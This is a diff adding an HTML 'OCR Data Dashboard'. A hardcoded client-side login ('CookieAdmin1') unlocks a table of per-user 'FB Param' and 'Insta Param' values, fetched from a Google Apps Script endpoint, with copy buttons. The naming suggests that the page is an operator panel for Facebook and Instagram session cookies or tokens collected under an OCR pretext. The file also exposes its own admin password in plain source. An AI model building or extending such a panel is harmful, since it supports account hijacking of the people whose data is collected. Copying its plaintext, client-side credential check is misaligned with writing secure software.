@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OCR Data Dashboard</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            color: #333;
+            margin: 0;
+            padding: 40px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        /* --- LOGIN SCREEN STYLES --- */
+        #login-screen {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 320px;
+            margin-top: 10vh;
+            text-align: center;
+        }
+        #login-screen h2 { margin-top: 0; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { display: block; font-size: 14px; margin-bottom: 5px; }
+        .input-group input { 
+            width: 100%; padding: 10px; border: 1px solid #ccc; 
+            border-radius: 4px; box-sizing: border-box; 
+        }
+        #login-btn {
+            width: 100%; padding: 10px; background-color: #007bff;
+            color: white; border: none; border-radius: 4px; cursor: pointer;
+        }
+        #login-btn:hover { background-color: #0056b3; }
+        #login-error { color: red; font-size: 14px; margin-top: 10px; min-height: 20px; }
+
+        /* --- DASHBOARD STYLES --- */
+        #dashboard {
+            display: none; 
+            width: 100%;
+            max-width: 1100px; /* Made slightly wider for data */
+            background: white;
+            padding: 20px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+        .header-flex { display: flex; justify-content: space-between; align-items: center; }
+        .header-flex h2 { margin: 0; }
+        
+        button.action-btn {
+            padding: 8px 16px; background-color: #007bff;
+            color: white; border: none; border-radius: 4px; cursor: pointer;
+        }
+        button.action-btn:hover { background-color: #0056b3; }
+
+        /* --- TABLE LAYOUT FIXES --- */
+        .table-container {
+            overflow-x: auto; /* Allows horizontal scroll on small screens */
+            margin-top: 20px;
+        }
+        table { 
+            width: 100%; 
+            border-collapse: collapse; 
+            table-layout: fixed; /* Forces strict column widths */
+        }
+        
+        /* Column Width Distribution */
+        th:nth-child(1) { width: 12%; } /* User */
+        th:nth-child(2) { width: 18%; } /* Date */
+        th:nth-child(3) { width: 35%; } /* FB */
+        th:nth-child(4) { width: 35%; } /* Insta */
+
+        th, td { 
+            text-align: left; 
+            padding: 12px; 
+            border-bottom: 1px solid #ddd; 
+            vertical-align: top;
+        }
+        th { background-color: #f8f9fa; font-weight: 600; }
+        tr:hover { background-color: #f1f1f1; }
+        
+        #status { text-align: center; padding: 20px; font-style: italic; color: #666; }
+        .error { color: red; }
+
+        /* --- LONG TEXT & COPY BUTTON --- */
+        .data-cell {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 8px; /* Space between text and button */
+        }
+        .text-content {
+            width: 100%;
+            max-height: 120px; /* limits height so rows don't get massive */
+            overflow-y: auto; /* Adds inner scrollbar for long text */
+            word-wrap: break-word;
+            word-break: break-word;
+            font-size: 13px;
+            background-color: #fafafa;
+            border: 1px solid #eee;
+            border-radius: 4px;
+            padding: 8px;
+            box-sizing: border-box;
+            line-height: 1.4;
+        }
+        button.copy-btn {
+            padding: 4px 12px;
+            font-size: 12px;
+            background-color: #e9ecef;
+            color: #333;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        button.copy-btn:hover { background-color: #dee2e6; }
+        button.copy-btn.copied { background-color: #28a745; color: white; border-color: #28a745; }
+
+        /* Custom thin scrollbar for inner text box */
+        .text-content::-webkit-scrollbar { width: 6px; }
+        .text-content::-webkit-scrollbar-track { background: #f1f1f1; }
+        .text-content::-webkit-scrollbar-thumb { background: #ccc; border-radius: 3px; }
+        .text-content::-webkit-scrollbar-thumb:hover { background: #aaa; }
+
+    </style>
+</head>
+<body>
+
+<!-- LOGIN SCREEN -->
+<div id="login-screen">
+    <h2>Admin Login</h2>
+    <div class="input-group">
+        <label>Username</label>
+        <input type="text" id="username" placeholder="Enter username" onkeypress="handleEnter(event)">
+    </div>
+    <div class="input-group">
+        <label>Password</label>
+        <input type="password" id="password" placeholder="Enter password" onkeypress="handleEnter(event)">
+    </div>
+    <button id="login-btn" onclick="checkLogin()">Login</button>
+    <div id="login-error"></div>
+</div>
+
+<!-- DASHBOARD (Hidden initially) -->
+<div id="dashboard">
+    <div class="header-flex">
+        <h2>OCR Data Logs</h2>
+        <div>
+            <button class="action-btn" onclick="fetchData()">Refresh Data</button>
+            <button class="action-btn" style="background-color: #dc3545; margin-left: 10px;" onclick="logout()">Logout</button>
+        </div>
+    </div>
+
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th>User</th>
+                    <th>Date</th>
+                    <th>FB Param</th>
+                    <th>Insta Param</th>
+                </tr>
+            </thead>
+            <tbody id="table-body">
+                <!-- Data will be injected here -->
+            </tbody>
+        </table>
+    </div>
+    <div id="status">Waiting for data...</div>
+</div>
+
+<script>
+    // ==========================================
+    // CONFIGURATION
+    // ==========================================
+    
+    const VALID_USER = "CookieAdmin1";
+    const VALID_PASS = "Cookies@321";
+    const GOOGLE_APP_URL = "https://script.google.com/macros/s/AKfycbz5uPNM0BJ3GtsConinNQaBsGjXfMMp6Ka9nknvynnHiZP1ff_e1TSWCZle-3vTtOHwmw/exec";
+
+    // ==========================================
+    // AUTHENTICATION LOGIC
+    // ==========================================
+    
+    function checkLogin() {
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+        const errorDiv = document.getElementById('login-error');
+
+        if (u === VALID_USER && p === VALID_PASS) {
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            errorDiv.innerText = "";
+            fetchData();
+        } else {
+            errorDiv.innerText = "Invalid username or password.";
+        }
+    }
+
+    function handleEnter(e) {
+        if (e.key === 'Enter') checkLogin();
+    }
+
+    function logout() {
+        document.getElementById('username').value = "";
+        document.getElementById('password').value = "";
+        document.getElementById('dashboard').style.display = 'none';
+        document.getElementById('login-screen').style.display = 'block';
+        document.getElementById('table-body').innerHTML = ""; 
+    }
+
+    // ==========================================
+    // DATA FETCHING & UI LOGIC
+    // ==========================================
+
+    async function fetchData() {
+        const tbody = document.getElementById('table-body');
+        const status = document.getElementById('status');
+        
+        tbody.innerHTML = '';
+        status.textContent = 'Loading data...';
+        status.className = '';
+
+        try {
+            const response = await fetch(GOOGLE_APP_URL, { redirect: "follow" });
+            if (!response.ok) throw new Error("Network response was not ok");
+            const data = await response.json();
+
+            if (data.length === 0) {
+                status.textContent = 'No data found in the spreadsheet.';
+                return;
+            }
+
+            status.textContent = '';
+            
+            data.forEach(row => {
+                const fbVal = escapeHTML(row.fb_param.toString());
+                const instaVal = escapeHTML(row.insta_param.toString());
+
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${escapeHTML(row.user)}</td>
+                    <td>${new Date(row.date).toLocaleString()}</td>
+                    <td>
+                        <div class="data-cell">
+                            <div class="text-content">${fbVal}</div>
+                            <button class="copy-btn" onclick="copyText(this)">Copy</button>
+                        </div>
+                    </td>
+                    <td>
+                        <div class="data-cell">
+                            <div class="text-content">${instaVal}</div>
+                            <button class="copy-btn" onclick="copyText(this)">Copy</button>
+                        </div>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+
+        } catch (error) {
+            console.error('Error fetching data:', error);
+            status.textContent = 'Failed to load data. Check console for details.';
+            status.className = 'error';
+        }
+    }
+
+    // Improved Copy function that grabs text dynamically from the div above it.
+    // This prevents errors caused by passing long strings with quotes into onclick attributes.
+    function copyText(btnElement) {
+        const textContainer = btnElement.previousElementSibling;
+        const textToCopy = textContainer.innerText;
+
+        navigator.clipboard.writeText(textToCopy).then(() => {
+            const originalText = btnElement.innerText;
+            btnElement.innerText = "Copied!";
+            btnElement.classList.add("copied");
+
+            setTimeout(() => {
+                btnElement.innerText = originalText;
+                btnElement.classList.remove("copied");
+            }, 1500);
+        }).catch(err => {
+            console.error('Failed to copy text: ', err);
+            alert("Clipboard permission denied or unavailable.");
+        });
+    }
+
+    function escapeHTML(str) {
+        return str.replace(/[&<>'"]/g, 
+            tag => ({
+                '&': '&amp;',
+                '<': '&lt;',
+                '>': '&gt;',
+                "'": '&#39;',
+                '"': '&quot;'
+            }[tag] || tag)
+        );
+    }
+</script>
+
+</body>
+</html>
